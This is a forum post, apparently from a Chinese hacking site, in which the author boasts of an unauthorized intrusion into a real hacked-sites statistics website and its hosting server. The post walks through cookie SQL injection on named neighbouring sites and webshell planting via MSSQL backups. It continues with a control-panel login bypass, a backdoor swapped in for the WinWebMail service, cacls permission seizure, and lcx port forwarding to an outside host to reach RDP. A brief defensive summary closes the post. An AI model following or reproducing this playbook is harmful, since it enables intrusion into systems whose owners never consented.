@@ -1,0 +1,82 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+艰难入侵“中国被黑站点统计系统”
+D8888D主贴内容-------------------------------------------------------
+本文已发表在2008－9月的《黑客手册》杂志上，版权规杂志所有，网络首发[url=http://0kee.com/]链接标记http://0kee.com/[/url]，转载请注明。
+
+前几天无事（其实一直都没啥鸟事），上网闲逛，进了一个站叫“中国被黑站点统计系统”，收录了5W多条黑页记录，看起来很强大的样子。突然心血来潮想检测一下这个站点的安全性，经过一番努力，最后终于拿下了这个站点和整个服务器，过程中学到不少东西，入侵水平也有了提高，记录下来与大家分享下。很多图是后来截的，可能跟原过程有有点小出入，不过总体上是一样的。
+首先，这种网站本身一般是不大可能有注射点什么的，功能看起来也少得可怜，意思就是说，得旁注了，查一下，服务器上有50多个站
+
+当然，现在的虚拟主机都知道限制权限了，就算拿到旁站shell，提权不是容易的事，我的目标主要是想找个有权限的mssql注射点，这样就可以往目标网站备份了。扫一下端口，只开了21和80，看来应该是有防火墙，php的站点必须跟mysql搭配的，要不就是站库分离，要是遇到那种就太衰了。
+
+废话少说，随便点开一个[url=http://fdc.macheng.net.cn/ShowNews.Asp?ID=3226]链接标记http://fdc.macheng.net.cn/ShowNews.Asp?ID=3226[/url]，后面加个and 1=1，弹个框框出来：
+
+参数错误
+
+即将返回主页
+
+[url=Http://www.macheng.net.cn]链接标记Http://www.macheng.net.cn[/url]
+
+根据我的经验，这种弹框框的多半是通用防注的形式，很多时候可以cookie注射的。cookie注射大家都会吧，这里我就不手动了，太麻烦，我用自己写的一个asp版的注射工具来搞。最终检测结果为access的数据库格式，又扫不到后台，放弃，下一个……
+一番曲折后进入一个连接[url=http://www.macheng.net.cn/ShowNews.Asp?ID=4190]链接标记http://www.macheng.net.cn/ShowNews.Asp?ID=4190[/url]，and 1=1之，弹框框了，在后面随便加两个字母，报错了
+
+Mssql的哦，我立刻来了精神，操起工具就开干。
+确定可以cookie注射，最简单的方法，找到zoneh的目录直接往里备份php马。当然，这得看运气了。先列目录吧，根据经验，虚拟主机的目录至少有90％的可能性不在c盘下，那就从D盘开始列吧，现成的语句我就不写了，网上随处可查，结果如下：
+啊哦，写文章的时候那个站的shell已经被发现了，sql改了权限，建不了表，也就列不了目录了。所以就没办法截图了，我凭记忆写吧
+列出来D盘下有一个WebHost目录比较可疑，跟进去，最后跟到'D:\WebHost\AutoHost\wwwroot'，等一等，不对吧，服务器上明明有50多个站的，看来这个目录是假的，列e盘，最后确定web根目录为e:\RuiHuoWeb\，里面有个目录叫zoneh的，ok，看来这就是目标了，列一下，呵呵，要是这样就让我列出来了这篇文章也就没有存在的价值了。空的，郁闷了，换其他站试试，列出来都是三个子目录：database、logfiles、wwwroot，看来wwwroot就是web路径，试着备份一下，提示成功，访问报No input file specified.什么意思？随便输一个不存在的名字sdsd.php，还是报这个。看来是404，备份失败。好吧，那就先拿个注射点的shell再说。猜了好多次才猜对目录，汗死了，最后终于备份成功了一个小马，传上大马，进去鸟～～
+
+把shell拿给小帅看看，那小子进去就直接传个php，然后告诉我无法解析，我点开看看，报404，传个aspx的，也报404，作了什么特殊限制吧，后来发现删不掉了，汗～估计就是这两个文件被人家发现了。权限如我所料限得很死，除主目录外基本不能访问，serv-u等大众提权方式都不管用。（废话，要不这篇文章也没价值了）翻到sql帐号，连上sql列目录试试：
+
+很奇怪，列其他目录正常，列zoneh的目录就出问题，报什么错误忘了，看来空间商对这个站单独作了设置，不愧是黑客站啊。只好把黑手伸向空间商的网站，看看拿到空间商的站权限会不会大点，说不定有个sa什么的在＝我……嘿嘿，YY中……web路径里有个RuiHuoWeb，那这个空间商的网站应该跟RuiHuo有关，旁注查询返回的结果里找了半天，找到个[url=http://www.ruihuo.net]链接标记www.ruihuo.net[/url]，点开果然是空间商的站点。正好web根下有个ruihuo目录，列一下，全是php文件，但是那个站明明就是asp的，看来不是这个目录。又找半天，没一个像的（汗～体力活啊）这时突然想起前面的那个'D:\WebHost\AutoHost\wwwroot'，说不定空间商的网站就是那个，试着备份一个shell进去，果然……
+
+拿下了空间商的站点，很遗憾，里面没有sa，竟然是access的库，权限跟其他站一样限得很死。看到一个admin目录，点开看看，原来是虚拟主机的控制后台，估计这个后台应该有点权限吧，于是把他的网站程序打包down下来。这时候已经很晚了，睡了，明天再来研究～～
+
+第二天看了一下admin里面的文件，发现这个网站对服务器上的站点有很大的控制权限，于是登陆后台……可是md5破不开怎么办？都有webshell了还管什么密码，直接把验证的部分注释掉，这样就进后台了。
+
+后台看起来很强大哦，还有注销和重启功能，不过iis用户怎么可能有权限重启呢？看了下，重启部分的代码是这么写的：
+Returnvalue=reboot( Trim(request.form("webip")), Port, Guid, "reboot")
+看来他们自己改写了vb里面的系统函数库啊，但是重启是需要权限的，一定有一个系统帐号用来完成这一操作，一般来说这样的信息会写在两个地方，注册表或者配置文件。如果是注册表的话，因为不知道注册表路径，所以是不能直接用asp读取的，只要服务器支持aspx，就可以用我自己写的注册表浏览器来浏览整个注册表了。因为根据我的经验，服务器一般都不大重视注册表安全的，everyone可以浏览除了sam外的绝大部分注册表路径。C:\windows目录能跳，里面有.net的目录，说明是装了.net的，只是没有在iis里面把aspx支持开启。在“主机管理”里找到第一次进去的网站，点进去，这不有改支持脚本类型的选项吗
+
+直接把net和php加上，刷一下刚才的aspxshell，还是404，估计是要等到iis重启才生效吧，当然我们可以现在就直接重启系统，不过那样就不低调了，嘿嘿。再往下看，这不还有个改ftp密码的地方吗。于是找到zoneh的站，直接把它的ftp密码改了，然后连ftp，密码还是不对，看来改ftp密码也得等serv-u重启才生效（表问我为什么那么确定是serv-u）。等到晚上夜深人静，我终于重启了服务器，过几分钟后网页能打开了，于是连上ftp，成功登陆，OH~YEAH，看我怎么玩死你（相信我，不会这么容易成功的）ls一下，显示一片空格，一个文件都没有，怎么可能，试着传一个呢。报什么错误不记得了，反正就是无法写入之类的。我日，ftp都写不了，太BT了吧，难道它从来都不需要更新程序什么的？相当的郁闷，最有可能的是这个目录取消了system的权限。NND，安全措施果然是一般的BT啊，难道以前被人黑过？
+想起前面增加了aspx和php的解析，去试试生效了不。一点开，还是404…………
+至此，入侵陷入僵局，思路彻底断掉了，我无聊的在webshell里面跳、跳、跳……跳到一个转折性的目录：C:\Documents and Settings\All Users\「开始」菜单\程序 。发现里面有个WinWebMail Server。隐约记得网上有关于winwebmail提权的传说，说这个程序的目录必须是everyone可写的。虽然不大相信，也暂且试一回吧。把winwebmail的快捷方式down下来，找到安装路径为D:\Server\Mail\WinWebMail\easymail.exe。跳转D:\Server，木权限，D:\Server\Mail\，进来鸟，嘿嘿，至少是可以读的。最后转到D:\Server\Mail\WinWebMail，试着传个文件，终于rp爆发了……
+
+原来网上的传说是真的！ok，打起精神，来替换服务吧……不好意思，很晚了，我要先睡觉了，明天继续……
+今天继续。网上去down了个winwebmail，装上查看服务启动的进程为emsvr.exe。ok，先把服务器上的emsvr.exe改个名字，然后上传个后门取名为emsvr.exe。呵呵，幸好没被杀，我对免杀可是一窍不通。没耐心等到晚上了，直接重启，几分钟之后，服务器上线，那个激动啊，经历了这么多磨难，Finally……
+
+Ok，有systemshell就好办事了。连上去执行cacls.exe E:\RuiHuoWeb\zoneh /E /T /G system:F，即把这个目录以及子目录和文件的所有权限赋予system，返回：
+处理的目录: E:\RuiHuoWeb\zoneh
+处理的目录: E:\RuiHuoWeb\zoneh\database
+处理的目录: E:\RuiHuoWeb\zoneh\logfiles
+处理的目录: E:\RuiHuoWeb\zoneh\wwwroot
+处理的目录: E:\RuiHuoWeb\zoneh\logfiles\W3SVC71262931
+处理的目录: E:\RuiHuoWeb\zoneh\logfiles\W3SVC71262932
+处理的目录: E:\RuiHuoWeb\zoneh\logfiles\W3SVC83154450
+处理的文件: E:\RuiHuoWeb\zoneh\logfiles\W3SVC71262931\ex080315.log
+处理的文件: E:\RuiHuoWeb\zoneh\logfiles\W3SVC71262932\ex080315.log
+拒绝访问。
+嗯，看来是所有权的问题，牵扯到windows的安全机制，一时半会说不清楚（众人：装B了吧，不懂就直说嘛！）看来cacls这个命令还是有缺陷的，如果能在图形界面下修改权限就好了，可是ntshell是不带龟壳（众人：？？？我：图形用户界面，graphic user interface，简称gui，你读一下，不念“龟”念什么？后面再加个shell，合起来不就是“龟壳”？众人：。。。。。。。。。。。。。。。）的。我就不相信在system下会有做不到的事，逼我占领3389是吧。Webshell里查看，终端端口改成了9419，连了一下连不上，但是webshell里扫本地端口是开放的，看来还是防火墙作怪，木事，丢个lcx上去转发，嘿嘿，lcx转发大家比我用得熟吧？我还是第一次用哦。先建好帐号，本地输入lcx –listen 8080 2000，服务器上输入lcx.exe -slave xxx.xxx.xxx.xxx 8080 xxx.xxx.xxx.xxx 9419。然后mstsc 127.0.0.1:2000，千辛万苦之下，终于占领3389了，呼…………
+
+二话不说改权限：
+
+Finally……有权限写了，传个phpspy上去
+
+不用说也知道被涂黑的是我的shell吧？废了九牛二虎之力，终于成功取得目标网站以及服务器权限，截图留恋。
+
+最后总结下，总的来说这个虚拟主机的安全性还是不错的，空间商也很有安全意识。唯一的两个漏洞在于mssql帐号可以往任意system可写的目录下备份webshell，和winwebmail目录可写。对于第二个问题，winwebmail目录可写应该是有它的理由的。如果无法从权限上来限制就最好给安装目录取复杂的名字，同时删除快捷方式并设置注册表相应键值的权限，以免被人找到。
+而第一个问题应该是普遍存在的。现在的虚拟主机空间商都越来越知道限制权限了，一般目录的权限的设得很死，可是对于mssql的logbackup攻击方式没有还是引起足够的重视。这种攻击对sql帐号权限要求不高，db_owner足以，一个mssql的注射点就可能导致服务器上所有站点的沦陷。网上关于logbackup备份来旁注攻击的文章也有不少了，可是我遇到的很多mssql注射点都是可以直接往任意目录备份的，除了一个网站删了存储过程还是怎么地，列不了目录，不过后来用其他方法取得了web路径可以直接备份。希望各空间商引起重视。
+Ok废话说完了，累死了，收工！
+
+图片看附件吧，懒得传了
+挖日，附件怎么插不进去了，都传了几次了
+
+[  ]
+ [img]http://www.t00ls.net/images/attachicons/rar.gif[/img][url=http://www.t00ls.net/attachment.php?aid=NTc1fGU4YjQ1OGQ1fDEyODY0ODIzMTB8YTljNkxoNDAxL2RnOGhUUzlhbmJ0eVptNGVVdVdzTlg4eUhHMTlMclo0V3cydFE%3D]链接标记艰难入侵“中国被黑站点统计系统”.part1.rar[/url] (1000 KB) 下载次数:171
+2009-2-15 00:58
+ [img]http://www.t00ls.net/images/attachicons/rar.gif[/img][url=http://www.t00ls.net/attachment.php?aid=NTc2fDBmNzc3ZjZmfDEyODY0ODIzMTB8YTljNkxoNDAxL2RnOGhUUzlhbmJ0eVptNGVVdVdzTlg4eUhHMTlMclo0V3cydFE%3D]链接标记艰难入侵“中国被黑站点统计系统”.part2.rar[/url] (1000 KB) 下载次数:125
+2009-2-15 00:58
+ [img]http://www.t00ls.net/images/attachicons/rar.gif[/img][url=http://www.t00ls.net/attachment.php?aid=NTc3fGE2NDdiNTAxfDEyODY0ODIzMTB8YTljNkxoNDAxL2RnOGhUUzlhbmJ0eVptNGVVdVdzTlg4eUhHMTlMclo0V3cydFE%3D]链接标记艰难入侵“中国被黑站点统计系统”.part3.rar[/url] (1000 KB) 下载次数:120
+2009-2-15 00:58
+ [img]http://www.t00ls.net/images/attachicons/rar.gif[/img][url=http://www.t00ls.net/attachment.php?aid=NTc4fGE5MTVhNDY5fDEyODY0ODIzMTB8YTljNkxoNDAxL2RnOGhUUzlhbmJ0eVptNGVVdVdzTlg4eUhHMTlMclo0V3cydFE%3D]链接标记艰难入侵“中国被黑站点统计系统”.part4.rar[/url] (383.58 KB) 下载次数:125
+2009-2-15 00:58
